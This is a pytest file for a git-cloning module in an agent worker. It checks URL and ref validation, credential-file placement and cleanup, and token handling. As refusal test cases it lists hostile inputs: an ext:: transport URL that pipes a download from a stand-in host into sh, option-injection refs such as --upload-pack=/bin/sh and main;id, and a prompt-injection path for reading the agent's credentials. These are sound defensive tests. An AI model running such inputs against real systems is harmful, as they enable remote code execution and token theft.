"""Cloning the caller's repository, which is caller-supplied input.

`gitops.py` names three attacks in its docstring and none of them had a test.
The URL arrives on the task document, which means it arrived from an
authenticated caller, so every one of these is reachable from an ordinary API
submission:

* `ext::sh -c ...` -- git's `ext` transport executes the command it is given;
* a leading `-`, which makes git parse the URL as an option
  (`--upload-pack=/bin/sh` is the classic shape);
* the token in argv, which `/proc/<pid>/cmdline` makes world-readable.

The third is the one the tests here watch most closely, because the fix has a
second half that is easy to get wrong: the credential file must not live in the
directory the worker hands the agent as `TMPDIR`, and it must be gone before the
agent starts. Same uid, so the mode bits are not a boundary either way.
"""

from __future__ import annotations

import io
import os
import subprocess

import pytest

from agent_worker import gitops, workspace as workspace_mod
from agent_worker.gitops import GitError, validate_ref, validate_repository_url
from agent_worker.logs import build_logger
from agent_worker.secrets import GIT_PROVIDER, resolve_git_token
from swarm_common.models import Tenant, utcnow

from worker_seeds import TENANT
from fakes import FakeSecretClient


def _logger():
    return build_logger(
        task_id="task_1",
        attempt_id="att_1",
        tenant_id=TENANT,
        generation=1,
        runner_profile="mock",
        stream=io.StringIO(),
    )


# ---------------------------------------------------------------------------
# URL validation
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "url",
    [
        "ext::sh -c 'curl evil.example/x|sh'",
        "--upload-pack=/bin/sh",
        "-u",
        "file:///etc/passwd",
        "git://host/repo.git",
        "http://host/repo.git",           # cleartext is not on the allow-list
        "https://\nhost/repo.git",
        "https://host/repo.git\r\nmore",
        "",
        "https://",
    ],
)
def test_a_repository_url_that_could_execute_a_command_is_refused(url):
    with pytest.raises(GitError):
        validate_repository_url(url)


@pytest.mark.parametrize(
    "url",
    [
        "https://github.com/saga/repo.git",
        "https://github.com/saga/repo",
        "ssh://git@github.com/saga/repo.git",
    ],
)
def test_an_ordinary_repository_url_is_accepted(url):
    assert validate_repository_url(url) == url


def test_scp_style_urls_are_rewritten_to_ssh_so_there_is_one_code_path():
    """`git@host:path` is the trickiest branch: it has no scheme at all, so the
    scheme check would reject every one of them if they were not rewritten."""
    assert validate_repository_url("git@github.com:saga/repo.git") == (
        "ssh://git@github.com/saga/repo.git"
    )
    # The rewrite must not become a way to smuggle a different scheme back in.
    with pytest.raises(GitError):
        validate_repository_url("git@ext::sh -c id")


@pytest.mark.parametrize(
    "ref",
    ["--upload-pack=/bin/sh", "-x", "a..b", "main;id", "a b", "a\nb", "x" * 256],
)
def test_a_dangerous_git_ref_is_refused(ref):
    with pytest.raises(GitError):
        validate_ref(ref)


@pytest.mark.parametrize(
    "ref", ["main", "release/1.2", "v1.0.0", "9f3a1c2", "9f3a1c2b4d5e6f70819a2b3c4d5e6f7081920304"]
)
def test_an_ordinary_git_ref_is_accepted(ref):
    assert validate_ref(ref) == ref


def test_an_absent_ref_is_not_an_error():
    assert validate_ref(None) is None
    assert validate_ref("") is None


# ---------------------------------------------------------------------------
# where the credential lives, and for how long
# ---------------------------------------------------------------------------


def test_the_credential_file_is_never_written_into_the_agents_tmpdir(tmp_path):
    ws = workspace_mod.create(tmp_path / "ws", "att_1")
    cred = gitops._write_credentials(
        "https://github.com/saga/repo.git", "ghp_secret_token_value", ws.private
    )

    assert cred.parent == ws.private
    # `workspace.child_env` hands the agent ws.tmp as TMPDIR. Anything there is
    # one `cat $TMPDIR/.git-credentials` away from a prompt injection in the
    # repository that was just cloned.
    assert str(ws.tmp) not in str(cred)
    assert not (ws.tmp / ".git-credentials").exists()
    assert "TMPDIR" in ws.child_env() and ws.child_env()["TMPDIR"] == str(ws.tmp)

    body = cred.read_text()
    assert body.startswith("https://x-access-token:ghp_secret_token_value@github.com")
    assert oct(cred.stat().st_mode)[-3:] == "600"


def test_a_token_with_url_metacharacters_is_percent_encoded(tmp_path):
    """An unencoded `@` or `/` in a token would split the credential entry and
    git would silently match it against the wrong host."""
    cred = gitops._write_credentials(
        "https://github.com/saga/repo.git", "p@ss/wo:rd#1", tmp_path
    )
    line = cred.read_text().strip()
    assert "p%40ss%2Fwo%3Ard%231" in line
    assert line.count("@") == 1


def test_the_credential_file_is_removed_even_when_the_clone_fails(tmp_path, monkeypatch):
    """A file that outlives the clone is a token available to the agent for the
    whole attempt, so removal happens in a `finally`, on the failure path too."""
    ws = workspace_mod.create(tmp_path / "ws", "att_1")
    seen: dict[str, object] = {}

    class _Result:
        exit_code = 128
        timed_out = False
        duration_seconds = 0.1

    def fake_run_child(argv, **kwargs):
        seen["argv"] = list(argv)
        seen["cred_existed"] = (ws.private / ".git-credentials").exists()
        (kwargs["stderr_path"]).parent.mkdir(parents=True, exist_ok=True)
        (kwargs["stderr_path"]).write_text("fatal: repository not found")
        (kwargs["stdout_path"]).write_text("")
        return _Result()

    monkeypatch.setattr(gitops, "run_child", fake_run_child)

    with pytest.raises(GitError, match="exit 128"):
        gitops.shallow_clone(
            url="https://github.com/saga/repo.git",
            ref="main",
            destination=ws.work / "repo",
            private_dir=ws.private,
            logs_dir=ws.logs,
            timeout_seconds=30,
            logger=_logger(),
            token="ghp_secret_token_value",
        )

    assert seen["cred_existed"] is True
    assert not (ws.private / ".git-credentials").exists()
    # The token never reaches argv, because argv is world-readable through /proc.
    assert all("ghp_secret_token_value" not in part for part in seen["argv"])


def test_a_sha_ref_uses_fetch_because_a_shallow_clone_cannot_target_a_commit(
    tmp_path, monkeypatch
):
    ws = workspace_mod.create(tmp_path / "ws", "att_1")
    calls: list[list[str]] = []

    class _Result:
        exit_code = 0
        timed_out = False
        duration_seconds = 0.1

    def fake_run_child(argv, **kwargs):
        calls.append(list(argv))
        kwargs["stdout_path"].parent.mkdir(parents=True, exist_ok=True)
        kwargs["stdout_path"].write_text("9f3a1c2b4d5e6f70819a2b3c4d5e6f7081920304\n")
        kwargs["stderr_path"].write_text("")
        return _Result()

    monkeypatch.setattr(gitops, "run_child", fake_run_child)

    result = gitops.shallow_clone(
        url="https://github.com/saga/repo.git",
        ref="9f3a1c2b4d5e6f70819a2b3c4d5e6f7081920304",
        destination=ws.work / "repo",
        private_dir=ws.private,
        logs_dir=ws.logs,
        timeout_seconds=30,
        logger=_logger(),
    )

    verbs = {part for argv in calls for part in argv}
    assert {"init", "remote", "fetch", "checkout"} <= verbs
    assert "clone" not in verbs
    assert result.commit == "9f3a1c2b4d5e6f70819a2b3c4d5e6f7081920304"


def test_a_branch_clone_tracks_every_branch_after_its_single_branch_transfer(
    tmp_path, monkeypatch
):
    """The clone moves one ref; the step after it widens `remote.origin.fetch`
    (`TRACK_EVERY_BRANCH`), so a later `git fetch origin main` moves origin/main."""
    ws = workspace_mod.create(tmp_path / "ws", "att_1")
    calls: list[list[str]] = []

    class _Result:
        exit_code = 0
        timed_out = False
        duration_seconds = 0.1

    def fake_run_child(argv, **kwargs):
        calls.append(list(argv))
        kwargs["stdout_path"].parent.mkdir(parents=True, exist_ok=True)
        kwargs["stdout_path"].write_text("9f3a1c2b4d5e6f70819a2b3c4d5e6f7081920304\n")
        kwargs["stderr_path"].write_text("")
        return _Result()

    monkeypatch.setattr(gitops, "run_child", fake_run_child)
    destination = ws.work / "repo"
    gitops.shallow_clone(
        url="https://github.com/saga/repo.git",
        ref="lane/x",
        destination=destination,
        private_dir=ws.private,
        logs_dir=ws.logs,
        timeout_seconds=30,
        logger=_logger(),
    )
    clone = next(i for i, argv in enumerate(calls) if "clone" in argv)
    assert "--single-branch" in calls[clone]
    widen = calls[clone + 1]
    assert widen[-len(gitops.TRACK_EVERY_BRANCH):] == list(gitops.TRACK_EVERY_BRANCH)
    assert widen[widen.index("-C") + 1] == str(destination)


def _git(cwd, *args):
    return subprocess.run(
        ["git", *args], cwd=cwd, check=True, capture_output=True, text=True,
        env={**os.environ, "GIT_CONFIG_GLOBAL": os.devnull, "GIT_CONFIG_NOSYSTEM": "1",
             "GIT_AUTHOR_NAME": "t", "GIT_AUTHOR_EMAIL": "t@example.invalid",
             "GIT_COMMITTER_NAME": "t", "GIT_COMMITTER_EMAIL": "t@example.invalid"},
    ).stdout.strip()


@pytest.mark.parametrize("widened", [False, True], ids=["single-branch", "track-every-branch"])
def test_fetching_main_by_name_moves_origin_main_only_once_widened(tmp_path, widened):
    """F571b (#453): a lane clone held an `origin/main` older than main, and
    `git fetch origin main && git merge origin/main` merged the old one. With
    the single-branch refspec the fetch leaves origin/main where it was (the
    control: this test can come out the other way); widened, it moves."""
    origin = tmp_path / "origin"
    origin.mkdir()
    _git(origin, "init", "-q", "-b", "main")
    (origin / "f").write_text("1\n")
    _git(origin, "add", "f")
    _git(origin, "commit", "-q", "-m", "one")
    _git(origin, "checkout", "-q", "-b", "lane/x")
    _git(origin, "checkout", "-q", "main")

    clone = tmp_path / "clone"
    _git(tmp_path, "clone", "-q", "--depth", "1", "--no-tags", "--single-branch",
         "--branch", "lane/x", origin.resolve().as_uri(), str(clone))
    if widened:
        _git(clone, *gitops.TRACK_EVERY_BRANCH)
    # An origin/main that exists before main moves on: an earlier explicit
    # fetch, or a checkpoint restored from an earlier attempt.
    _git(clone, "fetch", "-q", "origin", "+refs/heads/main:refs/remotes/origin/main")
    stale = _git(clone, "rev-parse", "origin/main")

    (origin / "f").write_text("2\n")
    _git(origin, "commit", "-q", "-am", "two")
    tip = _git(origin, "rev-parse", "main")

    _git(clone, "fetch", "-q", "origin", "main")
    assert _git(clone, "rev-parse", "FETCH_HEAD") == tip
    assert _git(clone, "rev-parse", "origin/main") == (tip if widened else stale)


# ---------------------------------------------------------------------------
# whose token it is
# ---------------------------------------------------------------------------


def _tenant(credentials):
    return Tenant(
        tenant_id=TENANT,
        kind="group",
        principal="eng@saga.xyz",
        created_at=utcnow(),
        credentials=list(credentials),
    )


def test_the_clone_token_is_the_tenants_own_secret_not_a_platform_one():
    """One token able to clone every tenant's repositories would make a single
    malicious repository in one tenant a credential compromise for all of them."""
    client = FakeSecretClient({f"swarm-tenant-{TENANT}-git": "ghp_eng_token"})
    token = resolve_git_token(tenant=_tenant([GIT_PROVIDER]), client=client, logger=_logger())

    assert token == "ghp_eng_token"
    assert client.accessed == [f"swarm-tenant-{TENANT}-git"]


def test_a_tenant_without_a_registered_clone_token_gets_none_not_an_error():
    """A public repository clones without a credential; a private one fails with
    git's own message, which is the right diagnosis to surface."""
    client = FakeSecretClient()
    assert resolve_git_token(tenant=_tenant([]), client=client, logger=_logger()) is None
    assert client.accessed == []


def test_a_json_clone_secret_is_read_from_its_declared_field():
    client = FakeSecretClient({f"swarm-tenant-{TENANT}-git": '{"GIT_TOKEN": "ghp_json"}'})
    assert (
        resolve_git_token(tenant=_tenant([GIT_PROVIDER]), client=client, logger=_logger())
        == "ghp_json"
    )


def test_the_clone_token_is_registered_for_redaction_before_it_is_returned():
    logger = _logger()
    client = FakeSecretClient({f"swarm-tenant-{TENANT}-git": "ghp_long_enough_token"})
    resolve_git_token(tenant=_tenant([GIT_PROVIDER]), client=client, logger=logger)
    assert logger.scrub_text("saw ghp_long_enough_token here") == "saw ***REDACTED*** here"
